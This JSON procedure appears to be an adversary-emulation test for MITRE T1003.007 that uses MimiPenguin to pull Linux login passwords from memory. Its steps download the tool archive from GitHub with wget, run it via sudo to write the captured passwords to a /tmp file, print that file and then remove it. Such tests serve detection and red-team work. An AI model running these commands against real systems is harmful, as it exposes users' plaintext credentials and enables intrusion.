{
  "id": "a27418de-bdce-4ebd-b655-38f04842bf0c",
  "name": "Capture Passwords with MimiPenguin",
  "description": "MimiPenguin is a tool inspired by MimiKatz that targets Linux systems affected by CVE-2018-20781 (Ubuntu-based distros and certain versions of GNOME Keyring). \nUpon successful execution on an affected system, MimiPenguin will retrieve passwords from memory and output them to a specified file. \nSee https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-20781. \nSee https://www.tecmint.com/mimipenguin-hack-login-passwords-of-linux-users/#:~:text=Mimipenguin%20is%20a%20free%20and,tested%20on%20various%20Linux%20distributions.\n",
  "platforms": [
    "linux"
  ],
  "steps": [
    {
      "id": "412e50c4-b6e3-467a-80c0-7fffbb86f0af",
      "type": "execute-command",
      "data": {
        "command": "sudo #{MimiPenguin_Location} \u003e #{output_file}\ncat #{output_file}",
        "command_type": "bash"
      },
      "elevation_required": true
    },
    {
      "id": "d5e6e8e4-5661-40e2-8b93-1fd9f0462cc5",
      "type": "execute-command",
      "data": {
        "command": "rm -f #{output_file} \u003e /dev/null",
        "command_type": "bash"
      },
      "elevation_required": true
    },
    {
      "id": "ee26ff95-b201-41ad-b87e-2ae496e176a5",
      "name": "Check dependency 1/4",
      "description": "MimiPenguin script must exist on disk at specified location (#{MimiPenguin_Location})\n",
      "type": "execute-command",
      "data": {
        "command": "if [ -f \"#{MimiPenguin_Location}\" ]; then exit 0; else exit 1; fi;",
        "command_type": "bash"
      },
      "elevation_required": true
    },
    {
      "id": "5a386e7f-11fe-4b04-98bd-be2368d24356",
      "name": "Resolve dependency 1/4",
      "description": "MimiPenguin script must exist on disk at specified location (#{MimiPenguin_Location})\n",
      "type": "execute-command",
      "data": {
        "command": "wget -O \"/tmp/mimipenguin.tar.gz\" https://github.com/huntergregal/mimipenguin/releases/download/2.0-release/mimipenguin_2.0-release.tar.gz\nmkdir /tmp/mimipenguin\ntar -xzvf \"/tmp/mimipenguin.tar.gz\" -C /tmp/mimipenguin",
        "command_type": "bash"
      },
      "elevation_required": true
    },
    {
      "id": "5eae6a85-04e9-41c8-a37e-f20353cdb36c",
      "name": "Re-check dependency 1/4",
      "description": "MimiPenguin script must exist on disk at specified location (#{MimiPenguin_Location})\n",
      "type": "execute-command",
      "data": {
        "command": "if [ -f \"#{MimiPenguin_Location}\" ]; then exit 0; else exit 1; fi;",
        "command_type": "bash"
      },
      "elevation_required": true
    },
    {
      "id": "23700fee-e99a-441b-b8e1-96c6d440fb7b",
      "name": "Check dependency 2/4",
      "description": "Strings must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "if [ -x \"$(command -v strings --version)\" ]; then exit 0; else exit 1; fi;",
        "command_type": "bash"
      },
      "elevation_required": true
    },
    {
      "id": "dae94988-1850-407e-b485-d5d8a95c4883",
      "name": "Resolve dependency 2/4",
      "description": "Strings must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "sudo apt-get -y install binutils",
        "command_type": "bash"
      },
      "elevation_required": true
    },
    {
      "id": "c839e92d-23db-4bd1-86e6-1c7d64a8aa7f",
      "name": "Re-check dependency 2/4",
      "description": "Strings must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "if [ -x \"$(command -v strings --version)\" ]; then exit 0; else exit 1; fi;",
        "command_type": "bash"
      },
      "elevation_required": true
    },
    {
      "id": "7a504436-1542-442a-b252-0c4a26b30df2",
      "name": "Check dependency 3/4",
      "description": "Python2 must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "if [ -x \"$(command -v python2 --version)\" ]; then exit 0; else exit 1; fi;",
        "command_type": "bash"
      },
      "elevation_required": true
    },
    {
      "id": "d609b92e-da86-44bc-ac4f-ca49096ec0c1",
      "name": "Resolve dependency 3/4",
      "description": "Python2 must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "sudo apt-get -y install python2",
        "command_type": "bash"
      },
      "elevation_required": true
    },
    {
      "id": "76e0ed2b-dc78-40f4-bb29-0d7b40c26c10",
      "name": "Re-check dependency 3/4",
      "description": "Python2 must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "if [ -x \"$(command -v python2 --version)\" ]; then exit 0; else exit 1; fi;",
        "command_type": "bash"
      },
      "elevation_required": true
    },
    {
      "id": "93122fe8-d2d2-4d8f-b2e2-aa596e89c033",
      "name": "Check dependency 4/4",
      "description": "Libc-bin must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "if [ -x \"$(command -v ldd --version)\" ]; then exit 0; else exit 1; fi;",
        "command_type": "bash"
      },
      "elevation_required": true
    },
    {
      "id": "38d3dbe9-5254-4462-b649-5259083ae54a",
      "name": "Resolve dependency 4/4",
      "description": "Libc-bin must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "sudo apt-get -y install libc-bin",
        "command_type": "bash"
      },
      "elevation_required": true
    },
    {
      "id": "9b24f932-42c2-41c2-847d-9eed6d403cf7",
      "name": "Re-check dependency 4/4",
      "description": "Libc-bin must be installed\n",
      "type": "execute-command",
      "data": {
        "command": "if [ -x \"$(command -v ldd --version)\" ]; then exit 0; else exit 1; fi;",
        "command_type": "bash"
      },
      "elevation_required": true
    }
  ],
  "flows": [
    {
      "s": "412e50c4-b6e3-467a-80c0-7fffbb86f0af",
      "p": "on-success",
      "o": "d5e6e8e4-5661-40e2-8b93-1fd9f0462cc5"
    },
    {
      "s": "412e50c4-b6e3-467a-80c0-7fffbb86f0af",
      "p": "on-failure",
      "o": "d5e6e8e4-5661-40e2-8b93-1fd9f0462cc5"
    },
    {
      "s": "ee26ff95-b201-41ad-b87e-2ae496e176a5",
      "p": "on-success",
      "o": "412e50c4-b6e3-467a-80c0-7fffbb86f0af"
    },
    {
      "s": "ee26ff95-b201-41ad-b87e-2ae496e176a5",
      "p": "on-failure",
      "o": "5a386e7f-11fe-4b04-98bd-be2368d24356"
    },
    {
      "s": "5a386e7f-11fe-4b04-98bd-be2368d24356",
      "p": "on-success",
      "o": "5eae6a85-04e9-41c8-a37e-f20353cdb36c"
    },
    {
      "s": "5eae6a85-04e9-41c8-a37e-f20353cdb36c",
      "p": "on-failure",
      "o": "412e50c4-b6e3-467a-80c0-7fffbb86f0af"
    },
    {
      "s": "23700fee-e99a-441b-b8e1-96c6d440fb7b",
      "p": "on-success",
      "o": "412e50c4-b6e3-467a-80c0-7fffbb86f0af"
    },
    {
      "s": "23700fee-e99a-441b-b8e1-96c6d440fb7b",
      "p": "on-failure",
      "o": "dae94988-1850-407e-b485-d5d8a95c4883"
    },
    {
      "s": "dae94988-1850-407e-b485-d5d8a95c4883",
      "p": "on-success",
      "o": "c839e92d-23db-4bd1-86e6-1c7d64a8aa7f"
    },
    {
      "s": "c839e92d-23db-4bd1-86e6-1c7d64a8aa7f",
      "p": "on-failure",
      "o": "412e50c4-b6e3-467a-80c0-7fffbb86f0af"
    },
    {
      "s": "7a504436-1542-442a-b252-0c4a26b30df2",
      "p": "on-success",
      "o": "412e50c4-b6e3-467a-80c0-7fffbb86f0af"
    },
    {
      "s": "7a504436-1542-442a-b252-0c4a26b30df2",
      "p": "on-failure",
      "o": "d609b92e-da86-44bc-ac4f-ca49096ec0c1"
    },
    {
      "s": "d609b92e-da86-44bc-ac4f-ca49096ec0c1",
      "p": "on-success",
      "o": "76e0ed2b-dc78-40f4-bb29-0d7b40c26c10"
    },
    {
      "s": "76e0ed2b-dc78-40f4-bb29-0d7b40c26c10",
      "p": "on-failure",
      "o": "412e50c4-b6e3-467a-80c0-7fffbb86f0af"
    },
    {
      "s": "93122fe8-d2d2-4d8f-b2e2-aa596e89c033",
      "p": "on-success",
      "o": "412e50c4-b6e3-467a-80c0-7fffbb86f0af"
    },
    {
      "s": "93122fe8-d2d2-4d8f-b2e2-aa596e89c033",
      "p": "on-failure",
      "o": "38d3dbe9-5254-4462-b649-5259083ae54a"
    },
    {
      "s": "38d3dbe9-5254-4462-b649-5259083ae54a",
      "p": "on-success",
      "o": "9b24f932-42c2-41c2-847d-9eed6d403cf7"
    },
    {
      "s": "9b24f932-42c2-41c2-847d-9eed6d403cf7",
      "p": "on-failure",
      "o": "412e50c4-b6e3-467a-80c0-7fffbb86f0af"
    }
  ],
  "tags": [
    "T1003",
    "T1003.007"
  ],
  "input_arguments": [
    {
      "name": "output_file",
      "type": "path",
      "description": "Path where captured results will be placed",
      "value": "/tmp/T1003.007Test3.txt"
    },
    {
      "name": "MimiPenguin_Location",
      "type": "path",
      "description": "Path of MimiPenguin script",
      "value": "/tmp/mimipenguin/mimipenguin_2.0-release/mimipenguin.sh"
    }
  ]
}